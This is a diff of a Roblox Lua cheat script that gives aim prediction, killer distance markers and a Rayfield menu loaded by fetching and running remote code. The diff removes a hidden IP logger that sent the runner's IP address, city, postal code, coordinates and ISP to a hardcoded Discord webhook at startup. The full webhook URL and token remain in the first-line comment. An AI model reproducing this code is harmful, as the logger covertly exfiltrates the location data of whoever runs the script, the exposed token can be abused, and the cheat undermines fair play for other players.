@@ -1,7 +1,5 @@
--- MY WEBHOOK https://discord.com/api/webhooks/1481251321360158856/zvG-F-fpC1SslV7GKeMVSgEBZfr4hpvMh-45f0UALGlvcWQrYVKD_se3EaX6byobNcSd
 print("Hello Skitten4...")
--- [[ 1.5. DISCORD WEBHOOK & IP INFO ]]
-local HttpService = game:GetService("HttpService") -- Already exists at top, so reuse it
+
 -- [[ 1. SERVICES ]]
 local replicatedStorage = game:GetService("ReplicatedStorage")
 local  userInputService = game:GetService("UserInputService")
@@ -13,15 +11,13 @@ local    playersService = game:GetService("Players")
 local     debrisService = game:GetService("Debris")
 local      statsService = game:GetService("Stats")
 local        runService = game:GetService("RunService")
-local webhookURL = "https://discord.com/api/webhooks/1481251321360158856/zvG-F-fpC1SslV7GKeMVSgEBZfr4hpvMh-45f0UALGlvcWQrYVKD_se3EaX6byobNcSd"  -- replace with your actual webhook URL
-local ipAPI = "http://ipwho.is/"or"https://ipwho.is/8.8.4.4" or "https://ipwho.is/" 
-local function sendWebhook(message) local jsonData = HttpService:JSONEncode(message) local success, response = pcall(function() return HttpService:PostAsync(webhookURL, jsonData, Enum.HttpContentType.ApplicationJson)  end) if success then print("Discord webhook sent successfully:", response) else warn("Failed to send Discord webhook:", response) end end local function getIPInfo() local success, response = pcall(function() return HttpService:GetAsync(ipAPI) end) if success then local data = HttpService:JSONDecode(response) if data.success then print("IP Info Retrieved:", data.ip) local message = {content = "Here is the IP Information:",embeds = {{ title = "IPWho Information", fields = { { name =   "IP Address", value = data.ip }, { name =    "Continent", value = data.continent }, { name =      "Country", value = data.country .. " " .. data.flag.emoji }, { name =       "Region", value = data.region }, { name =         "City", value = data.city }, { name =  "Postal Code", value = data.postal }, { name =     "Latitude", value = data.latitude}, { name =    "Longitude", value = data.longitude}, { name =          "ISP", value = data.connection.isp }, { name = "Organization", value = data.connection.org }, { name =       "Domain", value = data.connection.domain }, { name =     "Timezone", value = data.timezone.id }, { name = "Calling Code", value = data.calling_code } }, footer = { text = "Data provided by ipwho.is" }, thumbnail = { url = data.flag.img }}}} sendWebhook(message) else warn("IPWho API Error:", data.message) end else warn("Failed to get IP info:", response) end  end
+
+
+
 -- Run once at script start
-local maxPerformanceActive = false
 local alwaysShowPredictionBox = false
-local predictStaticTargets = false -- The new toggle variable
-local lastIteration = tick()
-local frameHistory = {}
+
+
 -- [[ 2. GLOBAL VARIABLES (Declared BEFORE they are used) ]]
 local chancePlayerHumanoid, chancePlayerHRP = nil, nil
 local      chanceAiming = false
@@ -163,11 +159,7 @@ local function ExecuteAim(predicted, dt)
     end
 end
 
--- [[ 1. UPDATED COLORS & SETTINGS ]]
-local predBoxColor = Color3.fromRGB(25, 167, 255)
-local predBoxTransparency = 0.5
-
--- [[ 7. STABILIZED PREDICTION ENGINE - V2 ]]
+-- [[ 7. PREDICTION ENGINE ]]
 local function getUnifiedPrediction(targetHRP, mode)
     if not targetHRP then return nil end
     
@@ -179,55 +171,50 @@ local function getUnifiedPrediction(targetHRP, mode)
                     or 0
     
     local latency = ping + modeOffset
-    
-    local lastPos = targetHRP:GetAttribute("LastPos") or targetHRP.Position
-    local lastTime = targetHRP:GetAttribute("LastTime") or os.clock()
-    local currentTime = os.clock()
-    local deltaTime = currentTime - lastTime
+    -- Manual Velocity Tracker (Bypasses CFrame bots)
+local lastPos = targetHRP:GetAttribute("LastPos") or targetHRP.Position
+local lastTime = targetHRP:GetAttribute("LastTime") or os.clock()
+local currentTime = os.clock()
+local deltaTime = currentTime - lastTime
 
-    local velocity = Vector3.new(0,0,0)
-    if deltaTime > 0.01 then 
-        local rawVelocity = (targetHRP.Position - lastPos) / deltaTime
-        -- SPEED CAP: Prevents the aim from flying into the sky if they dash too fast
-        velocity = rawVelocity.Magnitude > 65 and (rawVelocity.Unit * 65) or rawVelocity
-    end
+local velocity = Vector3.new(0,0,0)
+if deltaTime > 0 then
+    velocity = (targetHRP.Position - lastPos) / deltaTime
+end
 
-    targetHRP:SetAttribute("LastPos", targetHRP.Position)
-    targetHRP:SetAttribute("LastTime", currentTime)
+-- Save current data for the next frame
+targetHRP:SetAttribute("LastPos", targetHRP.Position)
+targetHRP:SetAttribute("LastTime", currentTime)
     
-    -- THE SIXER FIX: 
-    -- If 'predictStaticTargets' is false, and the killer is moving slow (charging pounce), 
-    -- we return the current position (HRP) instead of predicting a "future" dash.
-    if not predictStaticTargets and velocity.Magnitude < 4 then 
-        return targetHRP.Position 
-    end
-    
-    -- Global threshold check
     if velocity.Magnitude < chanceMovementThreshold then return targetHRP.Position end
 
     local predicted = targetHRP.Position + (velocity * latency)
 
-    -- Acceleration Damping (The "Smoothness" for ASnap)
     if mode == "ASnap" or mode == "ACam" then
         local lastVel = targetHRP:GetAttribute("LastVelocity") or velocity
-        local accel = (velocity - lastVel)
+        local accel = velocity - lastVel
         targetHRP:SetAttribute("LastVelocity", velocity)
-        -- Dampens the flick when Sixer starts his jump
-        predicted += accel * (latency * 0.18) 
+        predicted += accel * (latency * 0.5)
+        
+        if autoPredictionEnabled and chancePlayerHRP then
+            local dist = (targetHRP.Position - chancePlayerHRP.Position).Magnitude
+            predicted += velocity * math.clamp(dist * 0.0025, 0, 0.35)
+        end
     end
 
-    if extraStuds > 0 then predicted += velocity.Unit * extraStuds end
+    if extraStuds > 0 then
+        predicted += velocity.Unit * extraStuds
+    end
+
     return predicted
 end
-
-
 
 -- === RAYFIELD LIBRARY LOADS BELOW THIS POINT ===
 
 print ("7.05 chance Aiming")
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 local Window = Rayfield:CreateWindow({
-                  Name = "Version 7.40(+)",
+                  Name = "Version 7.23(+)",
                   Icon = "cat"          ,
           LoadingTitle = "Place_Holder" ,
        LoadingSubtitle = "Place_Holder" ,
@@ -447,14 +434,7 @@ local Dropdown = ChanceTab:CreateDropdown({
     end,
 })
 
-ChanceTab:CreateToggle({
-   Name = "STOPS predicting slow targets (Sixer Dash Fix)",
-   CurrentValue = true,
-   Flag = "StaticGateToggle",
-   Callback = function(state)
-       predictStaticTargets = not state -- If true, it STOPS predicting slow targets
-   end,
-})
+
 
 
 local AdvancedSystemInputs1 = ChanceTab:CreateInput({
@@ -618,7 +598,7 @@ runService.Heartbeat:Connect(function(dt)
                     local marker = killerMarkerFolder:FindFirstChild(killer.Name.."Marker") or createKillerMarker(hrp, killer.Name)
                     local dist = (hrp.Position - chancePlayerHRP.Position).Magnitude
                     if marker:FindFirstChild("DistanceText") then marker.DistanceText.Text = math.floor(dist) end
-                    marker.Enabled = (dist > 0 and dist < 90)
+                    marker.Enabled = (dist > 1 and dist < 100)
                 end
             end
         else
@@ -738,8 +718,8 @@ InterfaceTab:CreateButton({
         local HttpService = game:GetService("HttpService")
         local success, response = pcall(function()
             -- Exploit executors usually support HttpGet or game:HttpGet
-            -- If HttpService fails, you might need to use HttpService:GetAsync("https://ipwho.is/") instead
-            return game:HttpGet("https://ipwho.is/") 
+            -- If HttpService fails, you might need to use game:HttpGet("https://ipwho.is/") instead
+            return HttpService:GetAsync("https://ipwho.is/") 
         end)
         
         if success then
@@ -763,137 +743,90 @@ InterfaceTab:CreateButton({
     end
 })
 
--- [[ 1. SEPARATE PERFORMANCE GUIs (Draggable) ]]
-local Stats = game:GetService("Stats")
-local RunService = game:GetService("RunService")
 local CoreGui = game:GetService("CoreGui")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local Stats = game:GetService("Stats")
 
-local PerfGui = Instance.new("ScreenGui")
-PerfGui.Name = "ModularPerformanceHUD"
-PerfGui.ResetOnSpawn = false
-pcall(function() PerfGui.Parent = CoreGui end)
-if not PerfGui.Parent then PerfGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui") end
+-- 1. Create the GUI but keep it HIDDEN at start
+local PingGui = Instance.new("ScreenGui")
+PingGui.Name = "CustomPingTracker"
+PingGui.Enabled = false -- Starts turned off!
 
--- Helper function to create clean, matching mini-boxes
-local function createMiniBox(boxName, startPos)
-    local frame = Instance.new("Frame")
-    frame.Name = boxName
-    frame.Size = UDim2.new(0, 85, 0, 28)
-    frame.Position = startPos
-    frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-    frame.BackgroundTransparency = 0.2
-    frame.BorderSizePixel = 2
-    frame.Active = true
-    frame.Draggable = true
-    frame.Visible = false -- Hidden by default until you toggle them in Rayfield!
-    frame.Parent = PerfGui
+local success = pcall(function() PingGui.Parent = CoreGui end)
+if not success then PingGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui") end
 
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 6)
-    corner.Parent = frame
+-- 2. Create the draggable background frame
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 120, 0, 35)
+MainFrame.Position = UDim2.new(0.5, 0, 0.1, 0) 
+MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+MainFrame.BorderSizePixel = 2
+MainFrame.BorderColor3 = Color3.fromRGB(100, 167, 255) 
+MainFrame.Active = true
+MainFrame.Parent = PingGui
 
-    local label = Instance.new("TextLabel")
-    label.Size = UDim2.new(1, 0, 1, 0)
-    label.BackgroundTransparency = 1
-    label.Font = Enum.Font.Code
-    label.TextSize = 13
-    label.Parent = frame
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 6)
+UICorner.Parent = MainFrame
 
-    return frame, label
-end
+-- 3. Create the Text Label
+local PingLabel = Instance.new("TextLabel")
+PingLabel.Size = UDim2.new(1, 0, 1, 0)
+PingLabel.BackgroundTransparency = 1
+PingLabel.Font = Enum.Font.Code
+PingLabel.TextSize = 18
+PingLabel.Text = "Ping: -- ms"
+PingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+PingLabel.Parent = MainFrame
 
--- Create the 3 individual boxes (Spread out slightly at the top)
-local PingBox, PingText = createMiniBox("PingBox", UDim2.new(0.5, -100, 0.05, 0))
-local FpsBox, FpsText   = createMiniBox("FpsBox", UDim2.new(0.5, 0, 0.05, 0))
-local MemBox, MemText   = createMiniBox("MemBox", UDim2.new(0.5, 100, 0.05, 0))
+-- 4. Custom Dragging Logic 
+local dragging, dragInput, dragStart, startPos
 
--- [[ 2. THE UPDATE LOOP ]]
-local lastIter = tick()
+MainFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = MainFrame.Position
 
-RunService.RenderStepped:Connect(function()
-    -- Only calculate if AT LEAST ONE box is visible (Saves phone battery!)
-    if not (PingBox.Visible or FpsBox.Visible or MemBox.Visible) then return end
-
-    local now = tick()
-    local fps = math.floor(1 / (now - lastIter))
-    lastIter = now
-    
-    local ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
-    local mem = math.floor(Stats:GetTotalMemoryUsageMb())
-    
-    -- Update Text
-    if PingBox.Visible then PingText.Text = "Ping: " .. ping end
-    if FpsBox.Visible then FpsText.Text = "FPS: " .. fps end
-    if MemBox.Visible then MemText.Text = "Mem: " .. mem .. "MB" end
-    
-    -- Color Warnings (Green = Good, Red = Bad)
-    PingBox.BorderColor3 = (ping > 150) and Color3.fromRGB(255, 100, 100) or Color3.fromRGB(100, 255, 100)
-    FpsBox.BorderColor3  = (fps < 30)   and Color3.fromRGB(255, 100, 100) or Color3.fromRGB(100, 255, 100)
-    MemBox.BorderColor3  = (mem > 1400) and Color3.fromRGB(255, 100, 100) or Color3.fromRGB(100, 255, 100)
-    
-    PingText.TextColor3 = PingBox.BorderColor3
-    FpsText.TextColor3  = FpsBox.BorderColor3
-    MemText.TextColor3  = MemBox.BorderColor3
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
 end)
 
--- [[ 3. RAYFIELD TOGGLES FOR INTERFACE TAB ]]
-InterfaceTab:CreateSection("Live Hardware Trackers")
+MainFrame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
 
-InterfaceTab:CreateToggle({
-    Name = "Show Ping Tracker",
-    CurrentValue = false,
-    Flag = "PingToggle",
-    Callback = function(state) PingBox.Visible = state end
-})
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        local delta = input.Position - dragStart
+        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
 
-InterfaceTab:CreateToggle({
-    Name = "Show FPS Tracker",
-    CurrentValue = false,
-    Flag = "FpsToggle",
-    Callback = function(state) FpsBox.Visible = state end
-})
+-- 5. Update Ping Every Frame (Optimized)
+RunService.RenderStepped:Connect(function()
+    -- Only run the math if the UI is actually turned on
+    if not PingGui.Enabled then return end 
 
-InterfaceTab:CreateToggle({
-    Name = "Show Memory Tracker",
-    CurrentValue = false,
-    Flag = "MemToggle",
-    Callback = function(state) MemBox.Visible = state end
-})
--- [[ PERFORMANCE SETTINGS ]]
+    local currentPing = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
+    PingLabel.Text = " " .. tostring(currentPing) .. " "  -- PING GUI
+    
+    if currentPing < 80 then
+        PingLabel.TextColor3 = Color3.fromRGB(100, 255, 100) 
+    elseif currentPing < 150 then
+        PingLabel.TextColor3 = Color3.fromRGB(255, 220, 100) 
+    else
+        PingLabel.TextColor3 = Color3.fromRGB(255, 100, 100) 
+    end
+end)
 
-
--- 1. Max Performance Toggle (The "Beast Mode")
-InterfaceTab:CreateToggle({
-    Name = "Max Performance (120 FPS / Max Aim)",
-    CurrentValue = false,
-    Flag = "MaxPerfToggle",
-    Callback = function(state)
-        maxPerformanceActive = state
-        if state then
-            -- Maximize Aim Settings
-            CAMSmoothing = 1.0   -- Snappiest camera
-            HRPSmoothing = 1.0   -- Snappiest body rotation
-            -- Attempt to unlock FPS (if your executor supports it)
-            if setfpscap then setfpscap(120) end
-            Rayfield:Notify({Title = "Performance Mode", Content = "Aim Maxed & 120 FPS Requested", Duration = 3})
-        else
-            -- Reset to your preferred defaults
-            CAMSmoothing = 0.7
-            HRPSmoothing = 0.7
-            if setfpscap then setfpscap(60) end
-        end
-    end,
-})
-
--- 2. Battery Saver Mode
-InterfaceTab:CreateToggle({
-    Name = "Auto Battery Saver",
-    CurrentValue = true,
-    Flag = "BatterySaverToggle",
-    Callback = function(state)
-        -- Logic handled in the main loop below
-    end,
-})
 -- 6. The Rayfield Toggle
 InterfaceTab:CreateToggle({
     Name = "Show Ping Tracker",
@@ -903,35 +836,8 @@ InterfaceTab:CreateToggle({
         PingGui.Enabled = state -- Turns the GUI on or off based on the toggle
     end,
 })
--- [[ ADD TO INTERFACE TAB ]]
-InterfaceTab:CreateSection("Visual Customization")
 
-InterfaceTab:CreateColorPicker({
-    Name = "Prediction Box Color",
-    Color = Color3.fromRGB(25, 167, 255),
-    Flag = "PredColor",
-    Callback = function(Value)
-        predBoxColor = Value
-        predictionMarker.Color = Value
-    end
-})
 
-InterfaceTab:CreateSlider({
-    Name = "Box Transparency",
-    Range = {0, 1},
-    Increment = 0.1,
-    Suffix = " Alpha",
-    CurrentValue = 0.5,
-    Flag = "PredAlpha",
-    Callback = function(Value)
-        predBoxTransparency = Value
-        -- Only apply if the box is actually supposed to be visible
-        if showPredictionBox or alwaysShowPredictionBox then
-            predictionMarker.Transparency = Value
-        end
-    end
-})
-getIPInfo()
 Rayfield:LoadConfiguration()
 
 
